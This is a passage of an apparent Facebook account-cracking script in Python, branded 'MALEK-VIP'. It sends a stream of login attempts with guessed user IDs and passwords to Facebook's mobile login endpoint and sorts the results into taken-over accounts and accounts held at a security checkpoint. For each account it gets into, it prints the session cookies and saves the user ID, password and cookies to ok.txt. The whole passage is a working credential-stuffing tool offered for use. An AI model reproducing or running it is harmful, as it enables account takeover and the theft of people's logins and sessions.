
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login/?ref=dbl&fl',
                'user-agent': ua,
            }

            data = {'lsd': uuid.uuid4().hex, 'jazoest': '2'+str(random.randint(1000, 9999)), 'email': uid, 'pass': pw, 'login': 'Log In'}
            url = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
            
            sys.stdout.write(f'\r\033[1;32m[MALEK-VIP] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()

            try:
                res = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
                if "c_user" in res.cookies.get_dict():
                    ok += 1
                    cookie = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
                    print(f'\n\033[1;32m[OK💚] {uid} | {pw}\n[🍪] {cookie}\n')
                    open('ok.txt', 'a').write(f'{uid}|{pw}|{cookie}\n'); break 
                elif "checkpoint" in res.cookies.get_dict():
                    cp += 1
                    print(f'\n\033[1;33m[CP💛] {uid} | {pw}')
                    open('cp.txt', 'a').write(f'{uid}|{pw}\n'); break
            except: time.sleep(2)

if __name__ == "__main__": main()
